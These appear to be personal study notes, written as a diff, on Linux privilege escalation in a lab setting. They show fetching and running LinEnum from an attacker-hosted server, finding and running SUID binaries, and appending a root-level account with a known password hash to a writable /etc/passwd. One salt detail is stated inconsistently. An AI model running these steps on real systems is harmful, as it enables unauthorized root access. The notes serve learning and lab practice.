@@ -1,6 +1,83 @@
 TERMS:
 Horizontal Privilege Escalation: Travel between users with the same privileges/access.
 Vertical Privilege Escalation: Going from an account of lesser access to one with higher. For instance a regular user to an admin. 
+Cron Jobs: The results of crons scheduling commands at specific times. 
 
 NOTES:
 What is privesc? Privilege escalation is going from lower to higher permission. This usually involves exploiting a vulnerability that gives you unauthorized access to certain resources.
+
+ENUMERATION:
+Linenum: https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
+This is a bash script that shows possible exploits that lead to privilege escalation.
+It comes in seperate sections of output...
+Kernel: shows kernel exploits
+Can we read/write sensitive files: shows sensitive files this user can write to. Shows misconfigured file privs.
+SUID(Set owner User ID) files: file that allows us to escalate privileges.
+Crontab Contents: shows possible cron jobs to exploit. 
+How to get on the target system:
+Host:
+go to path where the file is and start a server:
+python3 -m http.server 8000
+Target:
+user3@polobox:~$ wget 10.6.4.208:8000/LinEnum.sh
+--2024-05-12 22:25:44--  http://10.6.4.208:8000/LinEnum.sh
+Connecting to 10.6.4.208:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 46631 (46K) [text/x-sh]
+Saving to: ‘LinEnum.sh’
+
+LinEnum.sh               100%[===============================>]  45.54K   221KB/s    in 0.2s    
+
+2024-05-12 22:25:44 (221 KB/s) - ‘LinEnum.sh’ saved [46631/46631]
+
+user3@polobox:~$ chmod +x LinEnum.sh
+user3@polobox:~$ ./LinEnum.sh
+
+
+USING_SUID+GUID_FILES:
+Files that are these types can be run with the permissions of the owner/group
+r = read w = write x = execute
+7 is the maximum permission so chmod 755 would be rwxr-xr-x.
+This is following the format: 
+    user     group     others
+    rwx       rwx       rwx
+    421       421       421
+
+When looking for SUID and GUID files you want to look like permissions like this:
+
+SUID:
+rws-rwx-rwx
+GUID:
+rwx-rws-rwx
+
+LinEnum does this for us but to do this manually we can do: find / -perm -u=s -type f 2>/dev/null
+Example:
+user3@polobox:~$ find / -perm -u=s -type f 2>/dev/null
+/home/user3/shell
+user3@polobox:~$ ./shell
+This gives us root
+
+EXPLOITING_WRITEABLE_/ETC/PASSWD
+The /etc/passwd requires information needed upon loging into users. 
+The permissions for write should only be set to a superuser. 
+The /etc/passwd files are formatted into seven sections seperated by ":" each user has it's own line
+Section:
+1. Username: between 1 and 32 char
+2. Password: x indicates that pword is stored in /etc/shadow.
+3. UserID(UID): each user must have unique. 0 is stored for root. 1-99 predefined accts 100-999 administrative and system accts/groups
+4. GroupID(GID): Primary group id stored in /etc/group
+5. UserID Info: This is a comment that tells more about the account for instance a name, dept., etc.
+6. Home directory: The directory they will be in upon login. If not existent then it is a /
+7. Command/shell: path of command or shell /bin/bash
+Exploiting:
+-Go in through a writeable account and create a new line and use the format above to create a new user, setting the UID, GID, and shell to root. 
+-Must create a compliant password using: 
+--openssl passwd -1 -salt [salt] [password]
+---Output: $1$new$p7ptkEKU1HnaHpRtzNizS1
+---this is a hashed password from 123(salt) new(password)
+----Example using this password and username new to create a new root account:
+----new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
+----Add this line to the end of /etc/passwd
+----$ su new
+----Password: new
+ 
